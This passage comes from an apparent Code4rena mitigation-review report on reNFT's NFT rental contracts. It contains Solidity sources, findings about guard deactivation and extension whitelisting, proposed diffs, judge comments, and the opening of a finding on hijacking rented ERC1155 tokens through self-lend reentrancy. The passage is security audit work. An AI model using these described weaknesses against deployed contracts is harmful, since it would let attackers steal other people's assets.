        /**
        * @dev Determines if an array of items are supported by the protocol whitelist.
        *
        * @param items The items generated by the incoming rental order.
        */
        function _checkProtocolWhitelist(Item[] memory items) internal view {
            for (uint256 i = 0; i < items.length; ++i) {
                // Get the token address for the item
                address token = items[i].token;

                // Check that a rented asset exists in the whitelisted assets mapping.
                if (items[i].isRental() && !STORE.whitelistedAssets(token)) {
                    revert Errors.CreatePolicy_AssetNotWhitelisted(token);
                }

                // Check that a payment exists in the whitelisted payments mapping.
                if (items[i].isERC20() && !STORE.whitelistedPayments(token)) {
                    revert Errors.CreatePolicy_PaymentNotWhitelisted(token);
                }
            }
        }

        /////////////////////////////////////////////////////////////////////////////////
        //                            External Functions                               //
        /////////////////////////////////////////////////////////////////////////////////

        /**
        * @notice Callback function implemented to make this contract a valid Seaport zone.
        *         It can be considered the entrypoint to creating a rental. When a seaport
        *         order specifies the create policy as its zone address, Seaport will call
        *         this function after each order in the batch is processed. A call to
        *         `validateOrder` is what kicks off the rental process, and performs steps
        *         to convert a seaport order into a rental order which is stored
        *         by the protocol.
        *
        * @param zoneParams Parameters from the seaport order.
        *
        * @return validOrderMagicValue A `bytes4` value to return back to Seaport.
        */
        function validateOrder(
            ZoneParameters calldata zoneParams
        ) external override onlyRole("SEAPORT") returns (bytes4 validOrderMagicValue) {
            // Decode the signed rental zone payload from the extra data.
            (RentPayload memory payload, bytes memory signature) = abi.decode(
                zoneParams.extraData,
                (RentPayload, bytes)
            );

            // Create a payload of seaport data.
            SeaportPayload memory seaportPayload = SeaportPayload({
                orderHash: zoneParams.orderHash,
                zoneHash: zoneParams.zoneHash,
                offer: zoneParams.offer,
                consideration: zoneParams.consideration,
                totalExecutions: zoneParams.totalExecutions,
                fulfiller: zoneParams.fulfiller,
                offerer: zoneParams.offerer,
                orderType: zoneParams.orderType
            });

            // Generate the rent payload hash.
            bytes32 rentPayloadHash = _deriveRentPayloadHash(payload);

            // Recover the signer from the payload.
            address signer = _recoverSignerFromPayload(rentPayloadHash, signature);

            // Check: The signature from the protocol signer has not expired.
            _validateProtocolSignatureExpiration(payload.expiration);

            // Check: The fulfiller is the intended fulfiller.
            _validateFulfiller(payload.intendedFulfiller, seaportPayload.fulfiller);

            // Check: The data matches the signature and that the protocol signer is the one that signed.
            if (!kernel.hasRole(signer, toRole("CREATE_SIGNER"))) {
                revert Errors.CreatePolicy_UnauthorizedCreatePolicySigner(signer);
            }

            // Initiate the rental using the rental manager.
            _rentFromZone(payload, seaportPayload);

            // Return the selector of validateOrder as the magic value.
            validOrderMagicValue = ZoneInterface.validateOrder.selector;
        }

        /**
        * @notice Returns whether the interface is supported.
        *
        * @param interfaceId The interface ID to check against.
        */
        function supportsInterface(
            bytes4 interfaceId
        ) public view override(Zone, TokenReceiver) returns (bool) {
            return
                Zone.supportsInterface(interfaceId) ||
                TokenReceiver.supportsInterface(interfaceId);
        }
    }

</details>

<details>
<summary><b>Storage.sol</b></summary>



    // SPDX-License-Identifier: BUSL-1.1
    pragma solidity ^0.8.20;

    import {Kernel, Module, Keycode} from "@src/Kernel.sol";
    import {Proxiable} from "@src/proxy/Proxiable.sol";
    import {RentalUtils} from "@src/libraries/RentalUtils.sol";
    import {RentalId, RentalAssetUpdate, Item, SpentItem, ReceivedItem, OrderType} from "@src/libraries/RentalStructs.sol";
    import {Errors} from "@src/libraries/Errors.sol";

    /**
    * @title StorageBase
    * @notice Storage exists in its own base contract to avoid storage slot mismatch during upgrades.
    */
    contract StorageBase {
        /////////////////////////////////////////////////////////////////////////////////
        //                                Rental Storage                               //
        /////////////////////////////////////////////////////////////////////////////////

        // Points an order hash to whether it is active.
        mapping(bytes32 orderHash => bool isActive) public orders;

        // Points an item ID to its number of actively rented tokens. This is used to
        // determine if an item is actively rented within the protocol. For ERC721, this
        // value will always be 1 when actively rented. Any inactive rentals will have a
        // value of 0.
        mapping(RentalId itemId => uint256 amount) public rentedAssets;

        mapping(address erc721Token => uint256 count) public rentedERC721s;

        // Maximum rent duration.
        uint256 public maxRentDuration;

        /////////////////////////////////////////////////////////////////////////////////
        //                            Deployed Safe Storage                            //
        /////////////////////////////////////////////////////////////////////////////////

        // Records all safes that have been deployed by the protocol.
        mapping(address safe => uint256 nonce) public deployedSafes;

        // Records the total amount of deployed safes.
        uint256 public totalSafes;

        /////////////////////////////////////////////////////////////////////////////////
        //                                 Hook Storage                                //
        /////////////////////////////////////////////////////////////////////////////////

        // When interacting with the guard, any contracts that have hooks enabled
        // should have the guard logic routed through them.
        mapping(address to => address hook) internal _contractToHook;

        // Mapping of a bitmap which denotes the hook functions that are enabled.
        mapping(address hook => uint8 enabled) public hookStatus;

        /////////////////////////////////////////////////////////////////////////////////
        //                            Whitelist Storage                                //
        /////////////////////////////////////////////////////////////////////////////////

        // Allows the safe to delegate call to an approved address. For example, delegate
        // call to a contract that would swap out an old gnosis safe module for a new one.
        mapping(address delegate => bool isWhitelisted) public whitelistedDelegates;

        // Allows for the safe registration of extensions that can be enabled on a safe.
        mapping(address extension => uint8 enabled) public whitelistedExtensions;

        // Allows the use of these whitelisted tokens as rentable assets.
        mapping(address asset => bool isWhitelisted) public whitelistedAssets;

        // Allows the use of these whitelisted tokens as payments for rentals.
        mapping(address payment => bool isWhitelisted) public whitelistedPayments;
    }

    /**
    * @title Storage
    * @notice Module dedicated to maintaining all the storage for the protocol. Includes
    *         storage for active rentals, deployed rental safes, hooks, and whitelists.
    */
    contract Storage is Proxiable, Module, StorageBase {
        using RentalUtils for address;
        using RentalUtils for Item;
        using RentalUtils for Item[];
        using RentalUtils for SpentItem;
        using RentalUtils for ReceivedItem;
        using RentalUtils for OrderType;

        /////////////////////////////////////////////////////////////////////////////////
        //                         Kernel Module Configuration                         //
        /////////////////////////////////////////////////////////////////////////////////

        /**
        * @dev Instantiate this contract as a module. When using a proxy, the kernel address
        *      should be set to address(0).
        *
        * @param kernel_ Address of the kernel contract.
        */
        constructor(Kernel kernel_) Module(kernel_) {}

        /**
        * @notice Instantiates this contract as a module via a proxy.
        *
        * @param kernel_ Address of the kernel contract.
        */
        function MODULE_PROXY_INSTANTIATION(
            Kernel kernel_
        ) external onlyByProxy onlyUninitialized {
            kernel = kernel_;
            initialized = true;
        }

        /**
        * @notice Specifies which version of a module is being implemented.
        */
        function VERSION() external pure override returns (uint8 major, uint8 minor) {
            return (1, 0);
        }

        /**
        * @notice Defines the keycode for this module.
        */
        function KEYCODE() public pure override returns (Keycode) {
            return Keycode.wrap("STORE");
        }

        /////////////////////////////////////////////////////////////////////////////////
        //                              View Functions                                 //
        /////////////////////////////////////////////////////////////////////////////////

        /**
        * @notice Determines if an asset is actively being rented by a wallet.
        *
        * @param recipient  Address of the wallet which rents the asset.
        * @param token      Address of the token.
        * @param identifier ID of the token.
        *
        * @return Amount of actively rented tokens for the asset.
        */
        function isRentedOut(
            address recipient,
            address token,
            uint256 identifier
        ) external view returns (uint256) {
            // calculate the rental ID
            RentalId rentalId = RentalUtils.getItemPointer(recipient, token, identifier);

            // Determine if there is a positive amount
            return rentedAssets[rentalId];
        }

        /**
        * @notice Fetches the hook address that is pointing at the the target.
        *
        * @param to Address which has a hook pointing to it.
        */
        function contractToHook(address to) external view returns (address) {
            // Fetch the hook that the address currently points to.
            address hook = _contractToHook[to];

            // This hook may have been disabled without setting a new hook to take its place.
            // So if the hook is disabled, then return the 0 address.
            return hookStatus[hook] != 0 ? hook : address(0);
        }

        /**
        * @notice Determines whether the `onTransaction()` function is enabled for the hook.
        *
        * @param hook Address of the hook contract.
        */
        function hookOnTransaction(address hook) external view returns (bool) {
            // 1 is 0x00000001. Determines if the masked bit is enabled.
            return (uint8(1) & hookStatus[hook]) != 0;
        }

        /**
        * @notice Determines whether the `onStart()` function is enabled for the hook.
        *
        * @param hook Address of the hook contract.
        */
        function hookOnStart(address hook) external view returns (bool) {
            // 2 is 0x00000010. Determines if the masked bit is enabled.
            return uint8(2) & hookStatus[hook] != 0;
        }

        /**
        * @notice Determines whether the `onStop()` function is enabled for the hook.
        *
        * @param hook Address of the hook contract.
        */
        function hookOnStop(address hook) external view returns (bool) {
            // 4 is 0x00000100. Determines if the masked bit is enabled.
            return uint8(4) & hookStatus[hook] != 0;
        }

        /**
        * @notice Determines whether the extension can be enabled on the rental safe.
        *
        * @param extension Address of the extension contract.
        */
        function extensionEnableAllowed(address extension) external view returns (bool) {
            // 2 is 0x10. Determines if the masked bit is enabled.
            return uint8(2) & whitelistedExtensions[extension] != 0;
        }

        /**
        * @notice Determines whether the extension can be disabled on the rental safe.
        *
        * @param extension Address of the extension contract.
        */
        function extensionDisableAllowed(address extension) external view returns (bool) {
            // 1 is 0x01. Determines if the masked bit is enabled.
            return uint8(1) & whitelistedExtensions[extension] != 0;
        }

        /////////////////////////////////////////////////////////////////////////////////
        //                            External Functions                               //
        /////////////////////////////////////////////////////////////////////////////////

        /**
        * @notice Adds an order hash to storage. Once an order hash is added to storage,
        *         the assets contained within are considered actively rented. Additionally,
        *         rental asset IDs are added to storage which creates a blocklist on those
        *         assets. When the blocklist is active, the protocol guard becomes active on
        *         them and prevents transfer or approval of the assets by the owner of the
        *         safe.
        *
        * @param orderHash          Hash of the rental order which is added to storage.
        * @param rentalAssetUpdates Asset update structs which are added to storage.
        */
        function addRentals(
            bytes32 orderHash,
            RentalAssetUpdate[] memory rentalAssetUpdates,
            Item[] memory items
        ) external onlyByProxy permissioned {
            // Add the order to storage.
            orders[orderHash] = true;

            for (uint256 i = 0; i < items.length; ++i) {
                Item memory item = items[i];

                if (item.isERC721()) {
                    rentedERC721s[item.token] += 1;
                }
            }

            // Add the rented items to storage.
            for (uint256 i = 0; i < rentalAssetUpdates.length; ++i) {
                RentalAssetUpdate memory asset = rentalAssetUpdates[i];

                // Update the order hash for that item.
                rentedAssets[asset.rentalId] += asset.amount;
            }
        }

        /**
        * @notice Removes an order hash from storage. Once an order hash is removed from
        *         storage, it can no longer be stopped since the protocol will have no
        *         record of the order. Addtionally, rental asset IDs are removed from
        *         storage. Once these hashes are removed, they are no longer blocklisted
        *         from being transferred out of the rental wallet by the owner.
        *
        * @param orderHash          Hash of the rental order which will be removed from
        *                           storage.
        * @param rentalAssetUpdates Asset update structs which will be removed from storage.
        */
        function removeRentals(
            bytes32 orderHash,
            RentalAssetUpdate[] calldata rentalAssetUpdates,
            Item[] memory items
        ) external onlyByProxy permissioned {
            // Delete the order from storage.
            delete orders[orderHash];

            for (uint256 i = 0; i < items.length; ++i) {
                Item memory item = items[i];

                if (item.isERC721()) {
                    rentedERC721s[item.token] -= 1;
                }
            }

            // Process each rental asset.
            for (uint256 i = 0; i < rentalAssetUpdates.length; ++i) {
                RentalAssetUpdate memory asset = rentalAssetUpdates[i];

                // Reduce the amount of tokens for the particular rental ID.
                rentedAssets[asset.rentalId] -= asset.amount;
            }
        }

        /**
        * @notice Behaves the same as `removeRentals()`, except that orders are processed in
        *          a loop.
        *
        * @param orderHashes        All order hashes which will be removed from storage.
        * @param rentalAssetUpdates Asset update structs which will be removed from storage.
        */
        function removeRentalsBatch(
            bytes32[] calldata orderHashes,
            RentalAssetUpdate[] calldata rentalAssetUpdates
        ) external onlyByProxy permissioned {
            // Delete the orders from storage.
            for (uint256 i = 0; i < orderHashes.length; ++i) {
                // Delete the order from storage.
                delete orders[orderHashes[i]];
            }

            // Process each rental asset.
            for (uint256 i = 0; i < rentalAssetUpdates.length; ++i) {
                RentalAssetUpdate memory asset = rentalAssetUpdates[i];

                // Reduce the amount of tokens for the particular rental ID.
                rentedAssets[asset.rentalId] -= asset.amount;
            }
        }

        /**
        * @notice Adds the addresss of a rental safe to storage so that protocol-deployed
        *         rental safes can be distinguished from those deployed elsewhere.
        *
        * @param safe Address of the rental safe to add to storage.
        */
        function addRentalSafe(address safe) external onlyByProxy permissioned {
            // Get the new safe count.
            uint256 newSafeCount = totalSafes + 1;

            // Register the safe as deployed.
            deployedSafes[safe] = newSafeCount;

            // Increment nonce.
            totalSafes = newSafeCount;
        }

        /**
        * @notice Connects a hook to a destination address. Once an active path is made,
        *         any transactions originating from a rental safe to the target address
        *         will use a hook as middleware. The hook chosen is determined by the path
        *         set.
        *
        * @param to   Target address which will use a hook as middleware.
        * @param hook Address of the hook which will act as a middleware.
        */
        function updateHookPath(address to, address hook) external onlyByProxy permissioned {
            // Require that the `to` address is a contract.
            if (to.code.length == 0) revert Errors.StorageModule_NotContract(to);

            // Require that the `hook` address is a contract.
            if (hook.code.length == 0) revert Errors.StorageModule_NotContract(hook);

            // Point the `to` address to the `hook` address.
            _contractToHook[to] = hook;
        }

        /**
        * @notice Updates a hook with a bitmap that indicates its active functionality.
        *         A valid bitmap is any decimal value that is less than or equal
        *         to 7 (0x111).
        *
        * @param hook   Address of the hook contract.
        * @param bitmap Decimal value that defines the active functionality on the hook.
        */
        function updateHookStatus(
            address hook,
            uint8 bitmap
        ) external onlyByProxy permissioned {
            // Require that the `hook` address is a contract.
            if (hook.code.length == 0) revert Errors.StorageModule_NotContract(hook);

            // 7 is 0x00000111. This ensures that only a valid bitmap can be set.
            if (bitmap > uint8(7))
                revert Errors.StorageModule_InvalidHookStatusBitmap(bitmap);

            // Update the status of the hook.
            hookStatus[hook] = bitmap;
        }

        /**
        * @notice Toggles whether an address can be delegate called.
        *
        * @param delegate  Address which can be delegate called.
        * @param isEnabled Boolean indicating whether the address is enabled.
        */
        function toggleWhitelistDelegate(
            address delegate,
            bool isEnabled
        ) external onlyByProxy permissioned {
            whitelistedDelegates[delegate] = isEnabled;
        }

        /**
        * @notice Updates an extension with a bitmap that indicates whether the extension
        *         can be enabled or disabled by the rental safe. A valid bitmap is any
        *         decimal value that is less than or equal to 3 (0x11).
        *
        * @param extension Gnosis safe module which can be added to a rental safe.
        * @param bitmap    Decimal value that defines the status of the extension.
        */
        function toggleWhitelistExtension(
            address extension,
            uint8 bitmap
        ) external onlyByProxy permissioned {
            // Require that the `extension` address is a contract.
            if (extension.code.length == 0)
                revert Errors.StorageModule_NotContract(extension);

            // 3 is 0x11. This ensures that only a valid bitmap can be set.
            if (bitmap > uint8(3))
                revert Errors.StorageModule_InvalidWhitelistExtensionBitmap(bitmap);

            // Update the extension.
            whitelistedExtensions[extension] = bitmap;
        }

        /**
        * @notice Toggles whether a token can be rented.
        *
        * @param asset     Token address which can be rented via the protocol.
        * @param isEnabled Boolean indicating whether the token is whitelisted.
        */
        function toggleWhitelistAsset(
            address asset,
            bool isEnabled
        ) external onlyByProxy permissioned {
            whitelistedAssets[asset] = isEnabled;
        }

        /**
        * @notice Toggles whether a batch of tokens can be rented.
        *
        * @param assets    Token array which can be rented via the protocol.
        * @param isEnabled Boolean array indicating whether those token are whitelisted.
        */
        function toggleWhitelistAssetBatch(
            address[] memory assets,
            bool[] memory isEnabled
        ) external onlyByProxy permissioned {
            // Check that the arrays are the same length
            if (assets.length != isEnabled.length) {
                revert Errors.StorageModule_WhitelistBatchLengthMismatch(
                    assets.length,
                    isEnabled.length
                );
            }

            // Process each whitelist entry
            for (uint256 i; i < assets.length; ++i) {
                whitelistedAssets[assets[i]] = isEnabled[i];
            }
        }

        /**
        * @notice Toggles whether a token can be used as a payment.
        *
        * @param payment   Token address which can be used as payment via the protocol.
        * @param isEnabled Boolean indicating whether the token is whitelisted.
        */
        function toggleWhitelistPayment(
            address payment,
            bool isEnabled
        ) external onlyByProxy permissioned {
            whitelistedPayments[payment] = isEnabled;
        }

        /**
        * @notice Toggles whether a batch of tokens can be used as payment.
        *
        * @param payments  Token array which can be used as payment via the protocol.
        * @param isEnabled Boolean array indicating whether those token are whitelisted.
        */
        function toggleWhitelistPaymentBatch(
            address[] memory payments,
            bool[] memory isEnabled
        ) external onlyByProxy permissioned {
            // Check that the arrays are the same length
            if (payments.length != isEnabled.length) {
                revert Errors.StorageModule_WhitelistBatchLengthMismatch(
                    payments.length,
                    isEnabled.length
                );
            }

            // Process each whitelist entry
            for (uint256 i; i < payments.length; ++i) {
                whitelistedPayments[payments[i]] = isEnabled[i];
            }
        }

        /**
        * @notice Upgrades the contract to a different implementation. This implementation
        *         contract must be compatible with ERC-1822 or else the upgrade will fail.
        *
        * @param newImplementation Address of the implementation contract to upgrade to.
        */
        function upgrade(address newImplementation) external onlyByProxy permissioned {
            // _upgrade is implemented in the Proxiable contract.
            _upgrade(newImplementation);
        }

        /**
        * @notice Freezes the contract which prevents upgrading the implementation contract.
        *         There is no way to unfreeze once a contract has been frozen.
        */
        function freeze() external onlyByProxy permissioned {
            // _freeze is implemented in the Proxiable contract.
            _freeze();
        }

        /**
        * @notice Sets the maximum rent duration.
        *
        * @param newDuration The new maximum rent duration.
        */
        function setMaxRentDuration(uint256 newDuration) external onlyByProxy permissioned {
            maxRentDuration = newDuration;
        }
    }

</details>

<details>
<summary><b>Fallback.sol</b></summary>



    // SPDX-License-Identifier: BUSL-1.1
    pragma solidity ^0.8.20;

    import {Safe} from "@safe-contracts/Safe.sol";
    import {HandlerContext} from "@safe-contracts/handler/HandlerContext.sol";
    import {ISignatureValidator} from "@safe-contracts/interfaces/ISignatureValidator.sol";

    import {Kernel, Policy, Permissions, Keycode} from "@src/Kernel.sol";
    import {toKeycode} from "@src/libraries/KernelUtils.sol";
    import {Errors} from "@src/libraries/Errors.sol";
    import {Storage} from "@src/modules/Storage.sol";
    import {TokenReceiver} from "@src/packages/TokenReceiver.sol";
    import "forge-std/console.sol";

    /**
    * @title Fallback
    * @notice Acts as an interface to handle token callbacks, allowing the safe to receive
    *         tokens. In addition, rented assets that support `permit()` functionality will
    *         be prevented from doing so if they are assets that can be rented through the
    *         protocol.
    */
    contract Fallback is Policy, TokenReceiver, ISignatureValidator, HandlerContext {
        /////////////////////////////////////////////////////////////////////////////////
        //                         Kernel Policy Configuration                         //
        /////////////////////////////////////////////////////////////////////////////////

        // keccak256(SafeMessage(bytes message)");
        bytes32 private constant SAFE_MSG_TYPEHASH =
            0x60b3cbf8b4a223d68d641b3b6ddf9a298e7f33710cf3d3a9d1146b5a6150fbca;

        // bytes4(keccak256("isValidSignature(bytes32,bytes)")
        bytes4 private constant UPDATED_EIP1271_VALUE = 0x1626ba7e;

        // Modules that the policy depends on.
        Storage public STORE;

        /**
        * @dev Instantiate this contract as a policy.
        *
        * @param kernel_ Address of the kernel contract.
        */
        constructor(Kernel kernel_) Policy(kernel_) {}

        /**
        * @notice Upon policy activation, configures the modules that the policy depends on.
        *         If a module is ever upgraded that this policy depends on, the kernel will
        *         call this function again to ensure this policy has the current address
        *         of the module.
        *
        * @return dependencies Array of keycodes which represent modules that
        *                      this policy depends on.
        */
        function configureDependencies()
            external
            override
            onlyKernel
            returns (Keycode[] memory dependencies)
        {
            dependencies = new Keycode[](1);

            dependencies[0] = toKeycode("STORE");
            STORE = Storage(getModuleAddress(toKeycode("STORE")));
        }

        /////////////////////////////////////////////////////////////////////////////////
        //                            External Functions                               //
        /////////////////////////////////////////////////////////////////////////////////

        /**
        * @notice Returns the hash of a message that can be signed by safe owners.
        *
        * @param safe    Safe which the message is targeted for.
        * @param message Message which will be signed.
        */
        function getMessageHashForSafe(
            Safe safe,
            bytes memory message
        ) public view returns (bytes32 messageHash) {
            // Add the safe typehash to the message.
            bytes32 messageWithTypehash = keccak256(
                abi.encode(SAFE_MSG_TYPEHASH, keccak256(message))
            );

            // Encode the message with the domain separator.
            messageHash = keccak256(
                abi.encodePacked(
                    bytes1(0x19),
                    bytes1(0x01),
                    safe.domainSeparator(),
                    messageWithTypehash
                )
            );
        }

        /**
        * @notice Legacy implementation of `isValidSignature` to be compatible with gnosis
        *         safe. Determines whether the signature provided is valid for the data hash.
        *
        * @param data      Data which was signed.
        * @param signature Signature byte array associated with the data.
        *
        * @return EIP1271_MAGIC_VALUE
        */
        function isValidSignature(
            bytes memory data,
            bytes memory signature
        ) public view override returns (bytes4) {

            if (!isActive) {
                revert Errors.FallbackPolicy_Deactivated();
            }

            // Get the original sender. This is the address that called the safe.
            address originalSender = _msgSender();

            // Determine if the original sender is a token that has been whitelisted.
            if (STORE.whitelistedAssets(originalSender)) {
                revert Errors.FallbackPolicy_UnauthorizedSender(originalSender);
            } else if (!STORE.whitelistedAssets(originalSender)) {
                if (STORE.rentedERC721s(originalSender) != 0) {
                    revert("Active rentals are present!");
                }
            }

            // Caller should be a Safe.
            Safe safe = Safe(payable(msg.sender));

            bytes32 messageHash = getMessageHashForSafe(safe, data);

            // Check if the signature was signed by an owner of the safe.
            if (signature.length == 0 && safe.signedMessages(messageHash) == 0) {
                revert Errors.FallbackPolicy_HashNotSigned(messageHash);
            } else {
                safe.checkSignatures(messageHash, data, signature);
            }

            return EIP1271_MAGIC_VALUE;
        }

        // A helper function to split the signature 
        function splitSignature(bytes memory sig)
            public
            pure
            returns (uint8 v, bytes32 r, bytes32 s)
        {
            require(sig.length == 65);

            assembly {
                // first 32 bytes, after the length prefix.
                r := mload(add(sig, 32))
                // second 32 bytes.
                s := mload(add(sig, 64))
                // final byte (first byte of the next 32 bytes).
                v := byte(0, mload(add(sig, 96)))
            }

            return (v, r, s);
        }

        /**
        * @notice Standard EIP-1271 implementation that determines whether the signature
        *         provided is valid for the data hash. Used as a wrapper around the
        *         legacy gnosis safe implementation.
        *
        * @param dataHash  Hash of the data to be signed.
        * @param signature Signature byte array associated with the data hash.
        *
        * @return The EIP-1271 magic value.
        */
        function isValidSignature(
            bytes32 dataHash,
            bytes calldata signature
        ) external view returns (bytes4) {
            // Determine if the signature is valid.
            bytes4 value = isValidSignature(abi.encode(dataHash), signature);

            // To maintain compatibility, pass the updated EIP-1271 value.
            return (value == EIP1271_MAGIC_VALUE) ? UPDATED_EIP1271_VALUE : bytes4(0);
        }
    }

</details>

### Assessed type

Access Control

**[gzeon (judge) commented](https://github.com/code-423n4/2024-02-renft-mitigation-findings/issues/26#issuecomment-1979449695):**
> Requires admin error, but valid.

***

## [M-10 Mitigation Error](https://github.com/code-423n4/2024-02-renft-mitigation-findings/issues/61)

*Submitted by [EV_om](https://github.com/code-423n4/2024-02-renft-mitigation-findings/issues/61)*

Original Issue: [The owners of a rental safe can continue to use the old guard policy contract for as long as they want, regardless of a new guard policy upgrade](https://github.com/code-423n4/2024-01-renft-findings/issues/267)

### Lines of code

https://github.com/re-nft/smart-contracts/blob/97e5753e5398da65d3d26735e9d6439c757720f5/src/policies/Guard.sol#L399-L407

### Vulnerability

The original vulnerability constituted the ability of rental safe owners to indefinitely use an outdated guard policy contract, even after a newer version has been deployed. This situation arises because the protocol lacked a mechanism to enforce the update of guard policies across all safes, potentially leaving some safes operating under less secure or outdated policies.

### Mitigation

The mitigation introduces a protocol-wide capability to deactivate guard policies, aiming to prevent the continued use of outdated or insecure policies. However, this solution inadvertently introduced a new vulnerability: the potential for "bricking" rental safes if their associated guard policy is deactivated without providing a viable path for these safes to update to a new guard policy.

The only way for a safe owner to update the guard, if the one they are using becomes inactive, would be via a whitelisted `DelegateCall`, in the same manner as they would upgrade the Stop policy as described in the audit [documentation](https://github.com/code-423n4/2024-01-renft/blob/main/docs/protocol-whitelists.md#delegate-call-whitelist). However, the current implementation triggers a revert when a Guard policy is not active, before they can potentially execute a `DelegateCall` to upgrade the guard.

### Suggestion

Allow inactive guards to call whitelisted delegates. A potential implementation could look as follows:

```diff
diff --git a/src/policies/Guard.sol b/src/policies/Guard.sol
index c7823ca..1e94943 100644
--- a/src/policies/Guard.sol
+++ b/src/policies/Guard.sol
@@ -395,17 +395,22 @@ contract Guard is Policy, BaseGuard {
         bytes memory,
         address
     ) external override {
+        // Disallow transactions that use delegate call, unless explicitly
+        // permitted by the protocol.
+        if (operation == Enum.Operation.DelegateCall){
+            if (!STORE.whitelistedDelegates(to)) {
+                revert Errors.GuardPolicy_UnauthorizedDelegateCall(to);
+            } else {
+                // no need to check the transaction if it is to a whitelisted delegate
+                return;
+            }
+        }
+
         // Check if this guard is active for the protocol.
         if (!isActive) {
             revert Errors.GuardPolicy_Deactivated();
         }
 
-        // Disallow transactions that use delegate call, unless explicitly
-        // permitted by the protocol.
-        if (operation == Enum.Operation.DelegateCall && !STORE.whitelistedDelegates(to)) {
-            revert Errors.GuardPolicy_UnauthorizedDelegateCall(to);
-        }
-
         // Fetch the hook to interact with for this transaction.
         address hook = STORE.contractToHook(to);
         bool hookIsActive = STORE.hookOnTransaction(hook);
```

If this issue is addressed as suggested, it is important to keep in mind that disabled guards will also be able to call whitelisted delegates. It is crucial to ensure that this capability does not introduce any vulnerability.

### Conclusion

While the mitigation strategy addresses the original vulnerability of outdated guard policies, it introduces a new risk of rendering rental safes inoperative.

**[Alec1017 (reNFT) confirmed and commented](https://github.com/code-423n4/2024-02-renft-mitigation-findings/issues/61#issuecomment-1979617797):**
> I consider this to be a valid finding. If there was a scenario where the guard policy had to be deactivated, then it would be impossible for frozen wallets to be able to upgrade to an uncompromised guard contract. 
> 
> It would still be possible to return locked rentals to the original owners with a call to `stopPolicy.stopRental(orderHash)` since the guard contract is not invoked.
> 
> But, for assets that exist in the safe but were not rented, it is a bit more inconvenient. Effectively, until all rented assets across the entire protocol are manually returned either by the renters, lenders, or anyone else (protocol admins), the guard cannot be reactivated again to allow all affected safes to retrieve their non-rented assets. 
> 
> In this sense, it is *possible* to: 
> 1. Retrieve all rented assets in the safe once expired.
> 2. Retrieve all non-rented assets in the safe once all orders are stopped.
> 3. Allow affected safes to upgrade to a new guard once all orders are stopped.
> 
> The drawback is that gas must be spent to stop each order (likely to be paid by admin EOAs).

***

## [M-16 Unmitigated](https://github.com/code-423n4/2024-02-renft-mitigation-findings/issues/20)

*Submitted by [juancito](https://github.com/code-423n4/2024-02-renft-mitigation-findings/issues/20)*

Original Issue: [Blacklisted extensions can't be disabled for rental safes](https://github.com/code-423n4/2024-01-renft-findings/issues/43)

### Lines of code

https://github.com/re-nft/smart-contracts/blob/97e5753e5398da65d3d26735e9d6439c757720f5/src/modules/Storage.sol#L339

### Comments

When trying to disable a module, [it was only allowed for whitelisted modules](https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/policies/Guard.sol#L255-L267). This prevented from disabling dangerous modules that have been disabled, as the transaction would revert.

## Mitigation

[PR-15](https://github.com/re-nft/smart-contracts/pull/15): Blacklisted extensions cant be disabled for rental:

A [new module whitelist method](https://github.com/re-nft/smart-contracts/pull/15/files#diff-142d7deee8debfb3b4c125a95eb508ca4467362ed282f458ef10d8ba40e0d905R370-R384) was introduced.This allows to differentiate [extensions that should not be disabled](https://github.com/re-nft/smart-contracts/pull/15/files#diff-142d7deee8debfb3b4c125a95eb508ca4467362ed282f458ef10d8ba40e0d905R200).

So now when trying to disable a module, [it checks that it can be disabled](https://github.com/re-nft/smart-contracts/blob/cb5b483e4ea5695aabffd5f250a9a7757bfb1e02/src/policies/Guard.sol#L327-L330), regardless of if it was whitelisted or not. This way, modules can now be safely disabled after they are blacklisted.

[Tests were added](https://github.com/re-nft/smart-contracts/pull/15/files#diff-0e4e01145ef853f3486480d1ae1d6fcfe62b3cd8330339447c206a6f705e0126R11) to verify that blacklisted extensions can now be disabled under any circunstances.

### Impact

Compromised selfdestructed extensions can't be disabled.

### Vulnerability Details

An [extension code length check](https://github.com/re-nft/smart-contracts/pull/15/files#diff-142d7deee8debfb3b4c125a95eb508ca4467362ed282f458ef10d8ba40e0d905R375-R376) was implemented to make sure that the extension is a contract. In this case, some of the extension was compromised and selfdestructed, sp it won't be able to be deactivated.

### Recommended Mitigation Steps

Allow to disable extensions without code. ([`bitmap 0x1` is the bitmap for allowing to disable extensions](https://github.com/re-nft/smart-contracts/pull/15/files#diff-142d7deee8debfb3b4c125a95eb508ca4467362ed282f458ef10d8ba40e0d905R200-R203)).

```diff
-    if (extension.code.length == 0)
+    if (extension.code.length == 0 && bitmap != 1)
        revert Errors.StorageModule_NotContract(extension);
```

### Conclusions

Insufficient Mitigation

**[Alec1017 (reNFT) commented](https://github.com/code-423n4/2024-02-renft-mitigation-findings/issues/20#issuecomment-1979487180):**
> I think for this issue, it feels like it would be in the scope of an audit for the hook contract itself. As it stands, the admins would not actively choose to whitelist an extension that has `selfdestruct` functionality.

**[gzeon (judge) commented](https://github.com/code-423n4/2024-02-renft-mitigation-findings/issues/20#issuecomment-1979502533):**
> Lack of ability to recover from such a scenario and no explicit mention of no self-destruct in code/doc makes me think this issue is valid (unmitigated).
>
>Although, considering the following:
>
>> would be in the scope of an audit for the hook contract itself
>
>I will nullify other wardens' submission instead of marking as unsatisfactory.

***

## [An attacker is able to hijack any rented ERC1155 tokens and brick rentals involving ERC1155 tokens](https://github.com/code-423n4/2024-02-renft-mitigation-findings/issues/27)

*Submitted by [sin1st3r__](https://github.com/code-423n4/2024-02-renft-mitigation-findings/issues/27), also found by [EV_om](https://github.com/code-423n4/2024-02-renft-mitigation-findings/issues/68).*

**Severity: High**

### Lines of code

https://github.com/re-nft/smart-contracts/blob/97e5753e5398da65d3d26735e9d6439c757720f5/src/modules/Storage.sol#L1

### Impact

An attacker can hijack any rented ERC1155 tokens and therefore, permanently brick rentals involving ERC1155 tokens.

### The vulnerability

For this vulnerability to be exploited, an attacker needs to create a malicious order where the lender is a malicious smart contract the attacker controls and the borrower is also himself, so it's a self-lend. This self-lend takes advantage of a reentrancy during it's termination (`Stop::stopRent(maliciousOrder)`) allowing an attacker to hijack the ERC1155 tokens. 

### Proof of concept scenario

1. The attacker borrows 100 APE ERC1155 tokens with ID 5, from Alice
    - When the rental is added to the `Storage` through the function [`Storage::addRentals()`](https://github.com/re-nft/smart-contracts/blob/97e5753e5398da65d3d26735e9d6439c757720f5/src/modules/Storage.sol#L220), the state variable mapping `rentedAssets` is updated with how much ERC1155 tokens has the borrower (in this case, the attacker) has borrowed. 
